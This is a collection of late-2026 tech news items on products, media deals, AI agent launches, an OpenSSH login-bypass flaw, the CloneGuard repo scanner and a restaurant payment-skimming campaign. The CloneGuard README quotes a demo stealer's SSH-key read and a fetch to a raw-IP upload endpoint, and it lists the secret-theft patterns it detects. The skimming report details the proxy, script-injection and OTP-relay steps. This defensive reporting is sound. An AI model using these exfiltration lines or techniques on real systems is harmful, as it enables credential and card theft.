articles.title: The iPhone Duo has more than 100,000 optimized apps, Apple says
articles.body:
Apple’s iPhone Duo has been officially on sale for two weeks, and the company said today that the App Store now has over 100,000 apps that are built for the foldable.
The iPhone Duo has more than 100,000 optimized apps, Apple says
Even though a lot of apps have been updated for the iPhone Duo, they sometimes still have issues.
“It’s been wonderful to see how quickly developers have embraced iPhone Duo, and we’re grateful for their creativity and innovation,” Susan Prescott, Apple’s VP of Worldwide Developer Relations, says in a statement. “Today there are well over 100,000 apps built for iPhone Duo already live on the App Store, and thousands of optimized apps are being added to the store each day.” Prescott adds that “the enthusiasm has been incredible, and we’re excited to see the pace of updates continue to accelerate as more and more apps optimize for iPhone Duo.”
Although there are now many apps that are optimized for the Duo, they can sometimes still have some issues. When the Duo launched, users noted that the Instagram app was a little messy even though Apple gave it the “Made for iPhone Duo” label, and Instagram chief Adam Mosseri called the Duo a “bit of a tricky form factor.”

articles.title: Fox bought Roku
articles.body:
Fox has officially closed its $22 billion acquisition of Roku, the companies announced on Friday. With Roku under its umbrella, Fox now controls a major streaming platform that reaches more than 100 million households in the US.
Fox bought Roku
Fox now has control of Roku’s streaming platform, which reaches more than 100 million US households.
First announced in June, the deal will allow Fox to bring Fox Sports, news content, and local stations to Roku. “I would expect that we can grow our viewership in the US with a combination of Roku technology, Roku’s platform, the tremendous content that’s on The Roku Channel, and the content that Fox brings to it as well,” Fox CEO Lachlan Murdoch said at the time. Along with Roku, Fox also operates its own Fox One streaming service and the free streamer Tubi.
Though the deal might change what Roku showcases on its platform, it doesn’t look like it will affect the open nature of Roku’s streaming ecosystem. “We started Roku more than two decades ago to give people a better way to watch TV, and that mission doesn’t change today. What does change is our reach and resources,” Roku founder Anthony Wood said. “Fox has a deep respect for Roku’s culture and wholly shares our commitment to staying open to every content partner.” Wood now serves on Fox’s board of directors.

articles.title: Stranger Things is getting a live-action spinoff called Other Worlds
articles.body:
Netflix isn’t done with Hawkins, Indiana just yet. The streamer just announced a live-action spinoff of Stranger Things which is expected to debut in 2028. It’s called Other Worlds: A Stranger Things Adventure.
Stranger Things is getting a live-action spinoff called Other Worlds
The prequel series is set in the 1950s, and is expected to start streaming in 2028.
There aren’t a lot of details, but the show will be going back in time quite a bit. According to Netflix, Other Worlds is “a prequel set in the 1950s, before Stranger Things and before the stage play Stranger Things: The First Shadow.“ Franchise creators the Duffer brothers are back on board, and Stranger Things veteran Kate Trefry will serve as showrunner. British director Joe Wright is set to helm the first three episodes.
In a statement, the Duffers described the series as “Stranger Things, but also thrillingly fresh, with a new setting, new heroes and villains, and new… actually, we’re not allowed to say any more. Now, on to casting.“
It’s been clear that Netflix has been looking for ways to keep its most impactful series alive ever since Stranger Things wrapped up with its final season last year. So far that has included the animated spinoff Tales From ‘85, but a live-action series appears to show a much bigger effort behind expanding the franchise.

articles.title: Tesla is ‘winding down’ production of the Cybertruck next year
articles.body:
Tesla is getting the Cybertruck ready for retirement in an effort to ramp up its robotaxi output. In an X post on Friday, Tesla CEO Elon Musk said that the company will be “winding down” Cybertruck production at its Texas Gigafactory sometime around the middle of next year, “to make room for increased Cybercab production.”
Tesla is ‘winding down’ production of the Cybertruck next year
Cybertruck production at the Texas Gigafactory is being axed to make way for more Cybercabs.
The production plant in Austin, Texas, is the only Tesla facility that’s known to assemble the Cybertruck, and that’s equipped to make the specialized components required to build the vehicles. Musk hasn’t mentioned if Cybertruck production will be moved elsewhere, but doing so would be arduous, especially for a car that’s never sold well. While Tesla doesn’t break out individual Cybertruck sales figures, even the highest analyst estimates place the total number of deliveries at roughly 70,000 since its launch in 2023 — significantly below the 250,000 that Musk once predicted would be sold annually.
The Cybertruck has also been mired in controversy since it was introduced, from its divisive design (that isn’t road legal in many parts of the world), the numerous recalls for faulty or outright dangerous components, and the fatal accidents it’s been involved in. It’s an unusually long and complicated history for a vehicle that’s only been on the road for three years. If the Cybertruck does meet its demise in 2027, Tesla still has another ridiculous vehicle on the horizon to serve as its spiritual successor.

articles.title: OpenSSH Flaw Lets Attackers Log Into Password-Disabled Linux Accounts
articles.body:
OpenSSH Flaw Lets Attackers Log Into Password-Disabled Linux Accounts (bleepingcomputer.com) 55
			
		 	
				A newly disclosed OpenSSH flaw dubbed "*sshole" can allow attackers to log in to password-disabled accounts on certain musl-based Linux systems simply by submitting a password longer than 256 bytes. "Apparently certain varieties of musl Linux (Alpine, OpenWrt, Buildroot, Yocto, etc.) have had this OpenSSH vulnerability for about a decade," writes longtime Slashdot reader AlteredEgg. "Upgrade now!" BleepingComputer reports:  Security researcher Ozgun Kultekin, who discovered and released details on the vulnerability today, says the flaw has existed since 2016 and stems from how OpenSSH handles password verification errors on systems using the musl C library. Linux accounts can be configured to prevent password logins by replacing their password hash with an asterisk (*) in the /etc/shadow file. Because this is not a valid password hash, no password should allow access to those accounts. However, a patch introduced in OpenSSH in 2016 to fix a username enumeration vulnerability tracked as CVE-2016-6210 changed how OpenSSH handled accounts without usable password hashes.
To prevent attackers from identifying valid usernames through different response times, OpenSSH was modified to perform password hashing even when an account had no usable password hash, including accounts configured with * to block password logins. The problem is that the musl C library's crypt() function also returns * when password hashing fails, including when a submitted password exceeds its 256-byte limit. This means an attacker can submit an oversized password and cause OpenSSH to compare the returned * against the account's stored *, resulting in a successful login.
To be clear, the flaw does not allow attackers to bypass passwords on accounts with valid password hashes. [...] Admins who can't immediately install the update can mitigate the issue by turning off SSH password authentication with PasswordAuthentication no in their SSH server configuration and restarting SSH. Kultekin says admins can also check for signs of exploitation by examining SSH authentication logs for password-based logins for accounts that should not allow them.

articles.title: Salon.com shutters suddenly after 31 years
articles.body:
Today, after 31 years, we are saddened to announce that Salon is ceasing publication.
It’s difficult to find the right words for the end of something that has meant so much to so many people. Salon was never just a website. It was an idea about what journalism could be, born at a moment when the internet was still a largely unexplored frontier.
When Salon launched in November 1995, the web was a very different place. A small group of journalists set out to create something original: a publication with a strong voice, a curiosity about the world and a belief that the internet could bring journalism and readers together in new ways. They helped pioneer a form of journalism that would come to define an entirely new era of publishing.
Over three decades, Salon has brought together politics, culture, criticism and ideas in a way that was distinctly our own. Our journalism examined power and politics, questioned assumptions, surfaced stories that deserved attention and made room for perspectives that were too often overlooked. Our writers and editors helped shape conversations about the forces changing our lives. The work was never simply about keeping up with the news. It was about making sense of it.
The history of Salon is also the history of the people who made it. We are profoundly grateful to the journalists, editors, photographers, producers, designers, business teams and countless other colleagues who brought this publication to life across its many chapters. To the founders who imagined it, the staff members who built it, the contributors who gave it their voices and the alumni who carried its spirit into the world: Thank you. Salon’s legacy belongs to all of you.
We also want to thank our readers. You came to Salon for the journalism, the dialogue, the essays, the criticism, the unexpected discoveries and the sense that there was a place on the internet where ideas mattered. You read, shared, challenged, subscribed, wrote to us and kept coming back. Your engagement made Salon a publication and a community, and it gave our work meaning. We are so grateful for the time you spent with us.
The business realities of independent digital journalism have changed profoundly over the years. After careful consideration, we have reached the difficult decision that our publishing model is no longer sustainable. We know this news will be deeply disappointing to many of you, and we share that sadness.
Thirty-one years is a remarkable run, but what matters most is what happened during those years: the journalism, the ideas, the voices, the conversations and the community that grew around them. Salon helped demonstrate what digital journalism could be and could become. We hope that legacy will continue to matter long after today.
Thank you for being part of our story. It has been an extraordinary privilege.
Salon

articles.title: Blue Origin’s next launch now won’t happen until 2027
articles.body:
Blue Origin plans to do its next New Glenn rocket launch in January 2027, according to CNBC and the Financial Times, which cite a memo from CEO Dave Limp sent to staff. The new timeline follows a May launchpad explosion that damaged Blue Origin’s New Glenn launchpad ahead of a flight that would have brought Amazon Leo satellites into space.
Blue Origin’s next launch now won’t happen until 2027
Blue Origin had been aiming for a launch at the end of this year after a launchpad explosion in May, but now it’s reportedly targeting January.
In October, Blue Origin founder Jeff Bezos told Fox News that the company was aiming for a December New Glenn launch, joking that it could be “probably December 31st.” The new, revised launch window is “about 10 days later than Blue Origin’s earlier launch target,” CNBC reports. Limp also reportedly cited bad weather as having an effect on the launchpad rebuilding process.
“This small adjustment doesn’t diminish what we’ve accomplished or the importance of the work still ahead,” Limp wrote in his memo, per CNBC and the FT. “Returning New Glenn to flight remains our top priority — it’s worth it.”

articles.title: Partnering with Hacktron to find vulnerabilities in OpenAI's systems – OpenAI
articles.body:
Partnering with Hacktron to find vulnerabilities in OpenAI’s systems
Today we’re announcing a partnership with Hacktron to find vulnerabilities in OpenAI’s systems. Our engineers and Hacktron’s security researchers will choose high-priority areas to test together, with a focus on how our systems interact with third-party services. As part of the partnership, we’re expanding Hacktron’s access to our frontier models through Daybreak Red.
As we work to accelerate cyber defense with frontier AI, we’re applying the same urgency to finding and fixing vulnerabilities in our own systems. Earlier this week, we announced that Cathedral’s researchers will work alongside our teams in our next security sprint. We also raised our bug bounty rewards to give independent researchers more reason to pursue vulnerabilities our own testing may have missed.
We became familiar with Hacktron through our Security Bug Bounty program and were impressed by the impact of the vulnerabilities its researchers have discovered and disclosed to us. The team builds AI agents for code review, penetration testing, and red teaming. Their research(opens in a new window) has uncovered vulnerabilities in how applications, cloud infrastructure, and identity systems interact. Their work shows what’s possible when security engineers build around AI to move faster and take on more ambitious research.
As AI agents connect services in new ways, that combination of skills becomes even more valuable. Working alongside Hacktron will help us test those connections more deeply and use what we learn to strengthen our defenses.
We’re grateful to Hacktron and other independent researchers who put time into finding and reporting weaknesses to help strengthen the security that protects all our users. To see which systems are in scope or submit a finding, visit our Security Bug Bounty program(opens in a new window).

articles.title: Perplexity launches AI agents for work
articles.body:
Teammates are agents for complex, ongoing work
Perplexity teammates coordinate AI agents, manage ongoing projects, and follow through across ops, marketing, and more.
Perplexity pioneered the first web-capable AI assistant in July 2025 in the Comet browser. It was useful for booking restaurants, shopping, and dozens of uses popular with personal agents today.
Since then, model capabilities have advanced dramatically. And Perplexity Computer is where millions of people and companies do serious work with accurate AI. Personal agents need to be purpose-built for work.
Today, we’re launching teammates, personal agents that can take on that long-running work. They plan and coordinate projects, switch gears as priorities change, and present results for review. Users can inspect and guide their work along the way.
Computer can handle complex projects, but setting up an agent to own ongoing work required planning. Teammates build on the power of Computer, and work inside Computer with all of your tools and files.
A teammate coordinates Computer sessions and other teammates to keep projects moving. They remember and learn as they work across different workstreams like marketing, sales, support, operations, or finance.
Ongoing project ownership
Teammates represent a new way of working with AI. Users can delegate ongoing actions to teammates so people can focus on outcomes rather than coordinating every task. Built on Perplexity’s focus on accuracy and Computer’s multi-model capabilities, teammates plan the work, check results along the way, and bring completed work back for review.
Teammates can investigate issues, research a market, or test improvements to a product, among other tasks. They remember project goals, task history, and shared files across runs. Each new task a teammate takes on builds on the work already done.
Proactive monitoring and follow-through
Teammates monitor ongoing work and follow up as things change. They investigate and act without waiting for a fresh query.
For example, a sales teammate notices when a regular customer stops transacting. The teammate reviews their order history and support issues and investigates what changed.
Then, it creates an offer relevant to that customer or flags any issues to resolve before reaching out. It shares progress updates and approval requests until it completes the work.
Teammates also remember past work and apply feedback to future tasks. If a user tells an operations teammate an agency needs two weeks’ notice, it factors that lead time into future project schedules.
Shared direction across teams
Teammates can work across teams. Add a teammate to a Slack channel and colleagues can hand it work or ask for updates on a task.
Teammates can also pass work to each other. One teammate finds bugs on a website and passes its findings along to another to prepare fixes.
Coordination across tools and tasks
Teammates build on the projects, skills, and memory already available in Computer. For example, a sales teammate can use a project’s existing account research and sales goals, follow a skill for writing outreach, and run a weekly automation to review the pipeline.
It brings those pieces together to identify stalled conversations, prepare follow-ups for review, and apply the results to the next week’s work.
Isolated environments and access controls
Teammates build on Computer’s existing tool and project permissions. Each teammate runs in a separate environment, with browser sessions separate from other teammates.
Saved credentials are encrypted and entered securely. Users can review completed work, take over the desktop, or redirect a teammate as it works.
Workflows across the business
Teammates handle ongoing work across business functions. These examples show how monitoring, investigation, and follow-through work together:
- Marketing: A marketing teammate manages social posts, email campaigns, ads, search engine optimisation, and review notes, creating new ads based on what’s working. It monitors campaign performance and competitors’ promotions, drafts fixes when results slip, and suggests responses when competitors change prices.
- Sales: A sales teammate finds opportunities in customer enquiries, past purchases, and unfinished conversations. It prepares outreach and quotes, follows up on replies, and flags support issues that need to be resolved before reaching out.
- Customer support: A customer support teammate reviews the previous day’s complaints, summarises trends, and flags cases that need a personal response from the CEO. It drafts those responses, follows up with internal teams on fixes, and tracks each case through resolution.
- Operations: A teammate keeps project deadlines, checklists, vendors, and paperwork on track. It follows up on missing items when a deadline is 72 hours away, helping teams address gaps before work falls behind.
Setup and availability
Teammates are initially launching on the web and soon on iOS for Perplexity Max subscribers. Free and Pro subscribers can upgrade in Settings > Account > Subscription.
To create and configure a teammate:
- Sign in to Perplexity on the web and select Teammates in the left navigation.
- Give the teammate a name that reflects the project you want it to do, then follow the setup steps.
- Connect the tools it needs. Add plugins such as Slack, GitHub, or Gmail. For GitHub, choose which repositories the teammate can access.
- Describe the work it should own. Include where the work comes from, what it should deliver, and when it should act.
- Assign it to a project and give it an initial task, such as researching a market, improving a sign-up flow, or investigating bugs.
We’ll be expanding teammates’ access and features in the coming weeks.
Try teammates today.

articles.title: RIP Cybertruck. You Were Unloved, Unwanted, and Utterly Absurd
articles.body:
Elon Musk, in a post on X, has officially called time on the Cybertruck, stating that “Tesla will be winding down production of the Cybertruck at Gigafactory Texas around the middle of next year to make room for increased Cybercab production.”
Produced for less than four years, the polarizing pickup is seemingly dying as it lived, with the news being greeted in a flurry of replies in praise of the EV as well as deriding it. James Star, claiming to be a Tesla employee, posted that it was “the saddest news! Cybertruck (was) the best car Tesla sold,” right next to a user called Captain Ford who simply replied to Musk with “Fuck that shitbox.”
Tesla has not responded to WIRED’s request for comment and clarification that the Cybertruck will no longer be made at all. The Cybertruck is exclusively made at Gigafactory Texas, as this is apparently the only Tesla facility equipped with the machinery required to manufacture the truck’s unique stainless steel body, which supposedly started to rust in some cases.
Despite whipping up a fevered number of reservations—allegedly more than a million according to Musk, who at the end of 2023 crowed that demand was “off the charts!”—the truck failed to sell, shifting less than 50,000 units in total by March last year.
EVWire cites Kelley Blue Book data suggesting that Tesla sold 11,586 Cybertrucks in the first three quarters of this year in the US, down 28 percent year-over-year, adding that Musk’s announcement post came about 80 minutes after Tesla raised US Cybertruck prices and paused new orders for the entry-level Dual-Motor AWD version.
The Cybertruck proved not only to be wildly unpopular, it was also beset by troubles before it even reached customers. In 2023, WIRED covered a leaked Tesla report dated January 25, 2022, that showed the Cybertruck had basic design flaws, and that the preproduction “alpha” version was struggling with problems with its suspension, body sealing, noise levels, handling, and braking.
In November 2019, when Musk stepped onto a stage in California to launch his new cyberpunk-styled electric pickup, he decided to demonstrate the strength of the “unbreakable” glass windows by hurling a steel ball at them. In what has now entered into public relations folklore, the demo truck’s windows smashed not once, but twice. Musk swore, then joked: “There’s room for improvement.”
There most certainly was. In April 2024, a recall was issued for the Cybertruck because its accelerator pedal pad could come loose and get trapped by interior trim, which had the frightening potential of pushing the car to full speed.
In March last year, Tesla had to recall nearly all the Cybertrucks it had then produced because a stainless steel trim panel could become detached from the vehicle while driving, blaming the problem on the wrong type of glue, a new adhesive “not prone to environmental embrittlement.”
Back in May this year, Cybertrucks were struck down by the wrong type of grease, which meant that their wheels could potentially fall off. In what was then the EV’s 11th recall, it was declared that the Rear Wheel Drive (RWD) Cybertruck Long Range model might have faulty brake rotors. In a notice posted by the National Highway Traffic Safety Administration, Tesla stated that “brake rotor stud holes may crack and allow the stud to separate from the wheel hub.” Such a situation might have seen some RWD Cybertruck owners merrily driving along only to then be disconcertingly overtaken by their own wheels.
Musk even tried to get President Donald Trump to buy one of his Cybertrucks, creating an impromptu Tesla showroom on the White House South Lawn, no less. But, sadly, even President Trump must have smelt something was off about the truck as instead he shunned the pickup and opted for a 200-mph Model S Plaid in ultra red, clearly impressed with the interior, remarking that “Everything’s computer!”
At the end of 2024, Karl Brauer, executive analyst at car ranking service iSeeCars, told WIRED that he’d calculated that the Cybertruck’s six recalls to date at the time made the EV “worse than 91 percent” of all other 2024 vehicles.
Yet, despite supposedly being so unreliable, the Cybertruck did find a small but loyal audience. WIRED profiled a number of owners last year, all fervently in love with their vehicles, but who were periodically forced to endure insults and taunts that they were Nazis, perhaps referring to an on-stage gesture Musk made at the start of 2025.
However, despite evidence seemingly to the contrary, Musk claims he is killing the Cybertruck, not because of its unreliability and staggering unpopularity, but because he wishes to focus instead on Cybercab, an autonomous EV that is central to Tesla’s robotaxi ambitions but itself has had a rocky start.
Currently operating in Austin only, with a fleet supposedly numbered only in the hundreds, Musk apparently wants to ramp up production dramatically since he confirmed on an earnings call the first cab came off the line in February.
Musk sees Cybercab as very much the vision of Tesla’s future. The CEO has even said that Tesla should no longer be regarded as an automaker but as a robotics and autonomous vehicle company. “Cybertruck was an incredible technology development platform and lives on through Cybercab,” Cybertruck lead engineer Wes Morrill said on X.

articles.title: Show HN: Agentic Identity Broker, OAuth Delegation for AI Agents
articles.body:
Agentic Identity Broker manages delegation chains for on-behalf-of flows in Agentic AI, bridges distinct OAuth2 infrastructures, and provides a secure token vault. Deployed within the call path via gateways like Agentgateway, it offloads auth burdens from both agent and MCP server creators.
For users, it provides a simple way to manage consent, granting agents granular permissions across services such as Google, GitHub, Databricks, and Linear without compromising control.
- Secure Identity Management
Agent registration, principal authentication, and session management
- OAuth2 Delegation & Consent
Manage OAuth2 scopes and user consent for third-party service integrations
- Security-First Design
Sensitive value redaction, command injection prevention, cryptographic validation, and fail-closed architecture
- Rich Consent Experience
Modern UX for managing OAuth2 delegations with design system compliance
- Comprehensive Audit Logging
Structured JSON logging for compliance and security monitoring
Frameworks like FastMCP can implement the whole OAuth2.1 ceremonies as mandated by the MCP spec but this means that you have to configure it for every MCP Server you deploy and maintain it. You also have to configure secure storage and basically run a multitude of OAuth2 authorization servers. With the identity broker and a gateway you can dumb down MCP server development to only provide tools on the target technology you want. OAuth2 ceremonies, token vaulting and token translation are done transparently. Because token exchange is done centrally via a gateway, this allows agents to interact with hundreds of MCP servers via one channel.
If you want to offer an MCP server to your customers as part of your SaaS, the identity broker can provide an additional consent surface that records which agents were actually used. With centralized tool authorization, you can keep an audit trail of approvals on your side regardless of which agent the customer runs.
The agentic identity broker can simplify agents by requiring only a single user token that can be used with an arbitrary number of MCP servers. When paired with a portal for user interactions, token procurement can be front-loaded in the portal, and the agent's responsibility is to forward this token to upstream MCP servers via a gateway.
The impersonation feature allows to start delegation chains via privileged clients, like a Google Chat or Slack bridge. The broker can be instructed to trust for two independent machine identities to assume the session for a particular user. This allows to use the permissions of a user on the company chat in another third-party system.
The tool approval support in the broker allows to enforce tool calls independent of the agent interface in use. This allows a last resort check before emails get sent or documents shared with a central audit trail.
Check out the following docs:
- Quickstart — Get started with Agentic Identity Broker in minutes.
- agenticidentitybroker.dev – Underlying concepts, guides and API specs.
The architecture overview describes the system design, component boundaries, and domain glossary.
Agentic Identity Broker has a built-in consent management UI:
For contribution rules, test commands, and coverage reports, see CONTRIBUTING.md.
Agentic Identity Broker is currently in active development. We use this project in production internally for several MCP servers and have seen good potential. We are coding in the open to gauge our approach. If you find it useful, let us know. If you'd like a feature that's missing, open an issue in our GitHub repo.
While this project was created by professionals with decades of experience in the identity space (including building multiple OIDC and OAuth2 providers), it was developed with a strong focus on agentic engineering and spec-driven development. We review every PR and prioritize sound engineering practices over convenience.
Major roadmap topics include: (a) formalizing token exchange for agent-to-agent calls, (b) intent based authorization and (c) user facing acticity logs.
Thanks to all contributors who are helping to make the Agentic Identity Broker better.
Agentic Identity Broker is a Zalando Engineering project.

articles.title: HN: CloneGuard – scan a repo for credential-stealing tricks before you run it
articles.body:
Scan a project for malware tricks before you run it. Built after a fake-recruiter "demo app" tried to steal SSH and AWS keys.
cloneguard is a small, dependency-free Go command-line tool. It only reads files. It never runs, installs, or imports anything from the project it scans.
A common attack goes like this: someone posing as a recruiter sends you a "take-home
assignment" or "demo app". You clone it, run npm install or open it in your editor,
and it quietly uploads your SSH keys, cloud credentials, browser passwords or crypto
wallets. Often the trigger isn't the app itself but an install hook or an editor task
that runs the moment you open the folder.
cloneguard is a quick first look that catches the usual tricks, so you can decide whether the project is safe to touch.
Requires Go 1.24+. There are no third-party dependencies.
go build -o cloneguard ./cmd/cloneguard
Optionally put the binary on your PATH, for example mv cloneguard /usr/local/bin/.
cloneguard clone https://github.com/someone/demo-app   # clone, then scan right away
cloneguard scan ./some-folder                          # scan an existing folder
cloneguard scan                                        # scan the current folder
cloneguard ./some-folder                               # shorthand for scan
cloneguard scan --json ./some-folder                   # machine-readable output
clone runs git clone (which downloads files but does not execute project code) into
a folder named after the repo, or into [dir] if you give one, then scans it.
Other commands: cloneguard help, cloneguard version.
Flags go before the path.
This makes it easy to use in scripts or a git hook, e.g.
cloneguard scan . || exit 1.
Scanning the bundled demo/ folder, which contains a fake stealer and an auto-run
VS Code task:
$ cloneguard scan --no-color demo
 DANGEROUS  Do not run or install anything from this project.
1 critical, 2 high, 1 medium, 0 low
[CRITICAL] util.js:1  Reaches for your secrets AND talks to a suspicious server
[HIGH] .vscode/tasks.json:1  Runs a command the moment you open the folder
[HIGH] util.js:1  Touches your SSH keys
    > readFile("~/.ssh/id_rsa");
[MEDIUM] util.js:2  Connects to a raw IP address
    > fetch("http://203.0.113.7:8080/upload");
Each finding shows the file and line, the offending snippet, and a plain-English explanation of why it matters. (Output above is abbreviated.)
With --json the result has this shape:
{
  "root": "demo",
  "files_scanned": 2,
  "files_skipped": 0,
  "findings": [
    { "rule": "reads-ssh-keys", "title": "Touches your SSH keys",
      "severity": "high", "file": "util.js", "line": 1,
      "snippet": "...", "why": "..." }
  ],
  "verdict": "dangerous"
}
- Secret theft: code that reaches for SSH keys, cloud credentials (AWS, GCP, Azure, Kubernetes, Docker, npm, Git), shell history, browser passwords, wallets, or dumps all environment variables
- Suspicious network use: connections to raw IPs, webhook/paste/request-catcher drop-off sites (Discord webhooks, Telegram bots, pastebin, webhook.site, ...), public tunnel services, or base64-hidden URLs
- Download-and-run: code that downloads or decodes text and then executes it
(eval, new Function, curl | sh)
- Auto-run hooks: npm install scripts, .vscode/tasks.json tasks that run when the
folder is opened, risky setup.py
- Obfuscation: scrambled code such as _0x identifiers, hex escapes, or code hidden
behind long runs of whitespace
- Compiled binaries (.exe, .dll, .so, .dylib, .node, ...) checked into the repo
- Dangerous combinations in one file, such as reading keys AND talking to a suspicious server, which is escalated to critical
- Walks the folder, skipping .git, node_modules, __pycache__, .venv and venv (unless --include-deps), plus files over the size limit.
- Classifies each file as code, config, docs, lockfile or binary, and applies only the rules that make sense for that kind (docs and lockfiles are ignored for text rules).
- Runs line-by-line regex rules and per-file checks (for example parsing
package.json for install hooks).
- Combines findings: if one file has hits from multiple risky categories (credentials, network, dynamic execution, obfuscation), it raises a combined finding.
- Picks a verdict from the worst severity found (see exit codes above).
"No red flags found" is not proof of safety. It only means none of these common tricks were spotted. cloneguard is pattern-based, so determined attackers can evade it, and it can produce false positives on legitimate code (a password manager should touch browser data). For code from strangers, still use a throwaway VM or container.
go test ./...
Layout:
- cmd/cloneguard/main.go: CLI, flags and clone handling
- internal/scanner/rules.go: line-level detection rules (ID, severity, regex, explanation)
- internal/scanner/filechecks.go: per-file checks (package.json hooks, tasks.json, setup.py, binaries)
- internal/scanner/scanner.go: directory walk, file classification, verdict logic
- internal/report/report.go: human-readable text output
- demo/: a deliberately malicious sample for trying the tool
To add a detection, append a rule to lineRules in rules.go with an id, title,
severity, category, scope, regex and a plain-English why, then add a test in
internal/scanner/scanner_test.go.

articles.title: Restaurant Delivery Payment-Skimming Campaign
articles.body:
When customers order food online, they expect a familiar experience: find
    their restaurant, choose their meal, and pay. Increasingly, criminals are
    exploiting that familiarity by creating convincing clones of restaurant
    ordering websites, right down to the original site's underlying code.
  
    In early November 2026, InfoHawk researchers investigated a collection of
    suspicious websites that appear to be part of one or more coordinated
    restaurant impersonation and payment-skimming operations.
  
    Across two research passes, we identified 820 domains impersonating 35
    restaurant brands. Of those, 808 use the .delivery top-level
    domain, and the rest use .com or .shop.
  
    The scale is concerning, but what makes these sites particularly dangerous
    is how convincing they can be.
  
These aren't ordinary fake websites
    The investigation began with a suspicious domain:
    mlckessejersstey[.]delivery.
  
    The site impersonated Jersey Mike's, the popular sandwich chain, and
    reproduced its online ordering experience.
  
    Rather than simply displaying a crude imitation of the restaurant's website,
    the attackers used a more sophisticated approach: reverse-proxying the
    legitimate site while replacing the checkout payment form with a malicious
    one.
  
    A reverse proxy can retrieve content from a legitimate website and present
    it to visitors under a different domain. This allows an attacker-controlled
    site to display genuine pages and assets while selectively modifying the
    parts of the experience that matter to the attacker.
  
    In this case, the malicious checkout requested credit card information and
    also asked customers for the SMS verification code sent by their bank.
  
    This is a particularly dangerous combination. Capturing a credit card number
    is valuable to criminals; obtaining a one-time verification code could also
    help them authorize fraudulent transactions, depending on how the victim's
    bank uses that code.
  
    For consumers, the experience can appear nearly indistinguishable from
    ordering directly from the restaurant. The site looks familiar, the menu and
    ordering flow can behave normally, and the fraudulent payment form appears
    at the moment a customer expects to pay.
  
    Importantly, this does not require the legitimate restaurant's website to
    have been hacked. The attackers can operate on infrastructure they control
    while using the authentic restaurant website as the source of the content
    they display.
  
How the attack works
    Each clone is a reverse proxy: a server that sits between the victim
    and the real restaurant site, fetches every page from the real site as it is
    requested, edits it on the way through, and passes it on. Menus, prices,
    store hours, and the cart are live and correct, because they come from the
    real site. Only the payment step is replaced. Described from
    mlckessejersstey[.]delivery (Jersey Mike's); we believe the clones of the
    other brands run the same kit.
  
    - 
        The victim arrives from a search ad 
          A Google Search ad imitates the restaurant's listing and shows a
          look-alike domain. The domain is behind Cloudflare, so its real server
          is hidden, and Cloudflare gives it a valid certificate automatically
          (Google Trust Services here), so the browser shows "Connection is
          secure".
        
- 
        Every page is fetched live from the real site 
          The proxy forwards each request to the restaurant's own servers,
          adjusting the host name and cookies, and relays the answer. The real
          site's headers come through (on Jersey Mike's,
          x-powered-by: Nuxt and Amazon CloudFront headers), which
          is how we could tell which paths came from the real site and which
          from the scammer's server.
- 
        Addresses are rewritten to keep the victim on the fake domain 
          The proxy replaces the brand's own host names in pages, scripts, and
          redirects with the fake domain, and maps each backend to a path on it,
          such as /__bapi__/ or /__payments__/. Store
          lookup, menus, login, and cart all work, because those calls go back
          through the proxy to the real APIs. Even the brand's own bot-detection
          script still runs, with its endpoints rewritten.
- 
        Three scripts are injected into every page 
          A script blocker patches
          HTMLScriptElement.prototype.src so that listed scripts
          never load (on Jersey Mike's, the OneTrust cookie banner and Branch,
          which could send phone users to the app or the real domain). _jmu() finds the real checkout payment frame and
          points it at /js/index.html on the fake domain; a
          MutationObserver puts the fake one back whenever the page restores the
          real one. _chkT() reads the order total from the
          "Place order" button every half second and saves it, so the fake form
          shows the right amount.
- 
        The card form is the scammer's 
          A few paths are answered by the scammer's server instead of the real
          site: /js/* (the card form and its scripts) and /payment/socket.io. The form looks like part of checkout.
          On submit it collects every field (card number, expiry, CVV, name,
          phone) and sends it, with the site name, to the operator over a live
          socket.io connection.
- 
        An operator gets past the bank's check live 
          We believe a person watching a control panel uses the card elsewhere
          and, when the bank challenges that payment, tells the victim's page
          what to show next: "card declined, try another", a page asking for the
          SMS code (/js/confirmation/), an "approve in your bank
          app" page (/js/app/), or "invalid code, try again". We
          believe the code the victim types is what lets the operator's charge
          through 3-D Secure.
- 
        The victim is sent away 
          When the operator marks it a success, the page sets a cookie
          valid=77777 lasting until 2038 and sends the victim to
          another chain's real site
          (href.li/?https://www.jimmyjohns.com/; href.li hides
          where they came from). No order reaches the restaurant: the real
          payment step never runs, so there is no confirmation email and no
          food. We believe the victim's card is then charged for whatever the
          operator bought.
    Why this design. The clone never goes out of date, the victim builds
    a real order with a real total before anything looks wrong, and one kit
    works against any restaurant by changing the target site, the domain, and a
    few path rules. The scammer's server does very little work, which makes it
    cheap to move. Some variants skip the payment wording and only pin the
    frame's address, re-setting it every time the page changes it.
  
Distribution of the Delivery Scam
    Searching Google's ad archive (Ads Transparency Center) for the domains in
    our first sweep found at least 47 Google Search text ads between July
    7, 2026, and October 20, 2026, run under
    at least 46 separate advertiser accounts with at least 43 different,
    unrelated-looking business names (construction firms, a reptile rescue, a
    watch company). The ads below are a sub-sample: we searched only for the
    domains in our first sweep, so there are likely more. Each ad imitates a
    restaurant's search listing and shows a look-alike domain. Most ran for 1–4
    days, usually starting days after the domain was registered.
  
    Status: On November 4, 2026, 367 of the 820 domains still served a
    site, so they could be getting traffic through means other than ads. None of
    the ads below were still running on November 3, 2026, but this scam may also
    be running through other ads, or other means. Google's public Ads
    Transparency pages now show "Can't find ad" for the creatives and "No ads
    found" for the domains we checked, which suggests Google has taken them
    down; the "Ads Transparency page" links below will likely not load. The
    images and text here come from InfoHawk's own capture of Google's archive,
    made on or before November 3, 2026. Of the 47 ads below, 41 have Google's
    rendered image; the rest show the text from Google's ad preview. Domains in
    the image ads were read from the image and may contain small reading errors.
  
    
      Jimmy John's20Jul 7 – Sep 18
    
  
    
      Firehouse Subs12Jul 28 – Sep 30
    
  
    
      Dave's Hot Chicken11Aug 18 – Oct 20
    
  
    
      Jersey Mike's4Jul 21 – Jul 31
